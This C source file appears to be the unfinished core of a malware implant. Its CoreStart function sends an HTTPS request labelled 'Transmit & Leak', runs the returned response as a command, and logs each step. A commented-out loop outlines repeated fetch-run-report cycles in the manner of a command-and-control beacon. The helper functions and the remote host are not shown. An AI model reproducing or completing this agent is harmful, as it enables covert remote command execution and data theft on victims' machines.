#include "core.h"

GenericValue firstLogParam;
GenericValue secondLogParam;
GenericValue thirdLogParam;

void CoreStart() {
	LPSTR outputBuffer = NULL;
	
	// Init log
	initLog();

	/* TODO: Initialize configuration*/
	setParamInt((GenericValue*) &firstLogParam, GetLastError());
	Log(LOG_INFO, "CORE_START");
	
	// Transmit & Leak, TODO: POSTDATA, Transmission configuration, command pointer
	SendRequest((LPSTR*)&outputBuffer);
	setParamInt((GenericValue*)&firstLogParam, GetLastError());
	Log(LOG_INFO, "CORE_SENT_HTTPS_REQUEST");

	// while (command != NULL) {
	//	ParseResponse(outputBuffer, &commInfo, &telem, &command);
	//	runCmd(command)
	//  SendRequest(outputBuffer)
	// }
	// Process command

	runCmd(outputBuffer);
	setParamInt((GenericValue*)&firstLogParam, GetLastError());
	Log(LOG_INFO, "Command processed");
}